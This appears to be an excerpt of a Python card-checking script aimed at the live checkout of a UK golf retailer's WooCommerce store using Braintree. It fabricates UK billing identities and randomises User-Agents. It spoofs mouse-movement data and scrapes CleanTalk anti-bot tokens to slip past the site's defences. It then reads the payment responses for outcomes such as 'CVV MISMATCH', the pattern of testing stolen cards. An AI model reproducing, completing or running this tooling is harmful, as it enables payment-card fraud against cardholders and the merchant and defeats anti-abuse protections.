# ==================== gatet.py (النسخة النهائية المضادة للحظر) ====================
...
def generate_pointer_data():
    """تولد بيانات حركة ماوس عشوائية لكل طلب"""
    pointer_data = []
...
def extract_cleantalk_values(session, url):
    """تستخرج ct_checkjs و apbct_visible_fields من الصفحة (ديناميكياً)"""
    try:
...
def generate_valid_uk_data():
    ...
    uk_postcodes = ['S32 3YR', 'YO1 8SU', 'SW1A1AA', 'M11AE', 'B11TT', 'LS11UR', 'G11XU', 'EH11QQ']
    uk_cities = ['Hope Valley', 'York', 'London', 'Manchester', 'Birmingham', 'Leeds', 'Glasgow', 'Edinburgh']
    uk_phones = ['07712345678', '07890123456', '07987654321', '07412345678', '07567890123']
    uk_addresses = ['Warren Lodge, Bar Road', 'Flat 2, Popes Head Court', '10 Downing Street', '221B Baker Street']
    ...
    return {
        ...
        'company': f"{first}'s {random.choice(['Golf', 'Sports', 'Retail'])}" if random.choice([True, False]) else ''
    }
...
def ch(ccx):
    ...
    # User-Agent جديد لكل طلب
    user = ua.random
    print(f"[+] Using User-Agent: {user[:50]}...")
    ...
    # قيم ثابتة من الريكويستات الجديدة
    SWPEXT = 'd06023b7281da033474c43f78e27f02c'
    COOKIE_SCRIPT_CONSENT = '{"googleconsentmap":{"ad_storage":"targeting","analytics_storage":"performance","ad_personalization":"targeting","ad_user_data":"targeting","functionality_storage":"functionality","personalization_storage":"functionality","security_storage":"functionality"}}'
    
    # ================ استخراج قيم CleanTalk ديناميكياً قبل كل فحص ================
    ...
    apbct_prev_referer = 'https%3A%2F%2Fwww.expressgolf.co.uk%2Fbasket%2F'
    
    print(f"[+] ct_checkjs: {ct_checkjs[:30]}...")
    ...
    cookies_add = {
        'CookieScriptConsent': COOKIE_SCRIPT_CONSENT,
        'swpext86386': SWPEXT,
    ...
    cookies_update = {
        ...
        'ct_pointer_data': ct_pointer_data,
        'ct_ps_timestamp': ct_ps_timestamp,
        'apbct_prev_referer': apbct_prev_referer,
        'sbjs_session': f'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.expressgolf.co.uk%2Fcheckout%2F',
    }
    ...
    data_update = f'security={sec}&payment_method=braintree_cc&country=GB&state=Derbyshire&postcode={billing_postcode}&city={billing_city}&address={billing_address.replace(" ", "+")}&address_2=&s_country=GB&s_state=Derbyshire&s_postcode={billing_postcode}&s_city={billing_city}&s_address={billing_address.replace(" ", "+")}&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3Dhttps%253A%252F%252Fwww.expressgolf.co.uk%252Fbasket%252F%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D%26wc_order_attribution_utm_creative_format%3D%26wc_order_attribution_utm_marketing_tactic%3D%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fwww.expressgolf.co.uk%252Fcheckout%252F%26wc_order_attribution_session_start_time%3D2026-05-12%252018%253A48%253A59%26wc_order_attribution_session_pages%3D2%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3D{user.replace(" ", "%20")}%26billing_email%3D{billing_email}%26billing_first_name%3D{billing_first}%26billing_last_name%3D{billing_last}%26billing_company%3D{billing_company}%26billing_country%3DGB%26wc_address_validation_postcode_lookup_postcode%3D%26billing_address_1%3D{billing_address.replace(" ", "%20")}%26billing_address_2%3D%26billing_city%3D{billing_city}%26billing_state%3DDerbyshire%26billing_postcode%3D{billing_postcode}%26billing_phone%3D{billing_phone}%26mailchimp_woocommerce_newsletter%3D1%26shipping_first_name%3D{billing_first}%26shipping_last_name%3D{billing_last}%26shipping_company%3D%26shipping_country%3DGB%26wc_address_validation_postcode_lookup_postcode%3D%26shipping_address_1%3D{billing_address.replace(" ", "%20")}%26shipping_address_2%3D%26shipping_city%3D{billing_city}%26shipping_state%3DDerbyshire%26shipping_postcode%3D{billing_postcode}%26order_comments%3D%26shipping_method%255B0%255D%3Dflat_rate%253A82%26payment_method%3Dbraintree_cc%26braintree_cc_nonce_key%3D%26braintree_cc_device_data%3D%257B%2522correlation_id%2522%253A%2522{correlation_id}%2522%257D%26braintree_cc_3ds_nonce_key%3D%26braintree_cc_config_data%3D%26braintree_applepay_nonce_key%3D%26braintree_applepay_device_data%3D%257B%2522correlation_id%2522%253A%2522{correlation_id}%2522%257D%26braintree_paypal_nonce_key%3D%26braintree_paypal_device_data%3D%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252Fcheckout%252F&shipping_method%5B0%5D=flat_rate%3A82'
    
    response = r.post('https://www.expressgolf.co.uk/', params=params_update, headers=headers_update, data=data_update, cookies=cookies_update)
    ...
    cookies_final = {
        ...
        'woocommerce_cart_hash': 'acfc8518d8f86be0a7ce64e8b0c842b3',
    ...
    data_final = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fwww.expressgolf.co.uk%2Fbasket%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=&wc_order_attribution_utm_creative_format=&wc_order_attribution_utm_marketing_tactic=&wc_order_attribution_session_entry=https%3A%2F%2Fwww.expressgolf.co.uk%2Fcheckout%2F&wc_order_attribution_session_start_time=2026-05-12+18%3A48%3A59&wc_order_attribution_session_pages=2&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user.replace(" ", "+")}&billing_email={billing_email}&billing_first_name={billing_first}&billing_last_name={billing_last}&billing_company={billing_company}&billing_country=GB&billing_address_1={billing_address.replace(" ", "+")}&billing_address_2=&billing_city={billing_city}&billing_state=Derbyshire&billing_postcode={billing_postcode}&billing_phone={billing_phone}&shipping_first_name={billing_first}&shipping_last_name={billing_last}&shipping_company=&shipping_country=GB&shipping_address_1={billing_address.replace(" ", "+")}&shipping_address_2=&shipping_city={billing_city}&shipping_state=Derbyshire&shipping_postcode={billing_postcode}&order_comments=&shipping_method%5B0%5D=flat_rate%3A82&payment_method=braintree_cc&braintree_cc_nonce_key={tok}&braintree_cc_device_data=%7B%22correlation_id%22%3A%22{correlation_id}%22%7D&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&apbct_visible_fields={apbct_visible_fields}'
    ...
    if 'cvv' in search_text or 'cvv2 failure' in search_text:
        return 'CVV MISMATCH'
    ...
    if 'cleantalk suspect' in search_text:
